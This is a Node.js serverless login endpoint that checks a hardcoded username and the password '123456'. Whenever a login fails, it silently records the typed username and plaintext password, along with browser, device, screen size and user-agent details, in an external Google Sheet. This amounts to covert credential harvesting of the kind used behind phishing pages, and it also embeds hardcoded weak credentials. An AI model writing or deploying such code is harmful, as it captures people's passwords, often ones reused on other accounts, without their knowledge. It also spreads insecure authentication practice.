const { google } = require('googleapis');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { username, password, meta = {} } = req.body;

    // ─── Credential Check ────────────────────────────────────────────────────
    const VALID_USERNAME = 'nikhil';
    const VALID_PASSWORD = '123456';
    const isValid = (username === VALID_USERNAME && password === VALID_PASSWORD);

    // ─── Only log FAILED attempts silently ──────────────────────────────────
    if (!isValid) {
        logFailedAttempt({ username, password, meta }).catch(err =>
            console.error('❌ Sheet logging error:', err.message)
        );
    }

    return res.status(200).json({ success: isValid });
};

// ─── Google Sheets Logger ─────────────────────────────────────────────────────
async function logFailedAttempt({ username, password, meta }) {

    // ✅ Use full JSON credentials (most reliable - avoids \n encoding issues)
    let credentials;
    if (process.env.GOOGLE_CREDENTIALS_JSON) {
        credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS_JSON);
    } else {
        // Fallback: build from individual vars with robust key parsing
        let private_key = process.env.GCP_PRIVATE_KEY || '';
        // Handle both: already-real-newlines and escaped \n strings
        if (!private_key.includes('\n')) {
            private_key = private_key.replace(/\\n/g, '\n');
        }

        credentials = {
            type: 'service_account',
            project_id:    process.env.GCP_PROJECT_ID,
            private_key_id: process.env.GCP_PRIVATE_KEY_ID,
            private_key,
            client_email:  process.env.GCP_CLIENT_EMAIL,
            client_id:     process.env.GCP_CLIENT_ID,
            auth_uri:      'https://accounts.google.com/o/oauth2/auth',
            token_uri:     'https://oauth2.googleapis.com/token',
            auth_provider_x509_cert_url: 'https://www.googleapis.com/oauth2/v1/certs',
            client_x509_cert_url: process.env.GCP_CLIENT_CERT_URL,
            universe_domain: 'googleapis.com'
        };
    }

    const auth = new google.auth.GoogleAuth({
        credentials,
        scopes: ['https://www.googleapis.com/auth/spreadsheets']
    });

    const sheets = google.sheets({ version: 'v4', auth });

    // Detect Browser
    const ua = (meta.userAgent || '').toLowerCase();
    let browser = 'Unknown';
    if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
    else if (ua.includes('firefox'))                   browser = 'Firefox';
    else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
    else if (ua.includes('edg'))                       browser = 'Edge';
    else if (ua.includes('opr') || ua.includes('opera')) browser = 'Opera';

    // Detect Device
    let device = 'Desktop';
    if (/mobile|android|iphone|ipad/i.test(ua)) device = 'Mobile';
    else if (/tablet/i.test(ua)) device = 'Tablet';

    const row = [
        meta.timestamp  || new Date().toISOString(),
        username,
        password,
        browser,
        device,
        meta.screenSize || '',
        meta.language   || '',
        meta.userAgent  || ''
    ];

    await sheets.spreadsheets.values.append({
        spreadsheetId:    process.env.SPREADSHEET_ID,
        range:            'Sheet1!A1',
        insertDataOption: 'INSERT_ROWS',
        valueInputOption: 'RAW',
        requestBody: { values: [row] }
    });

    console.log('✅ Logged to sheet:', { username, browser, device });
}
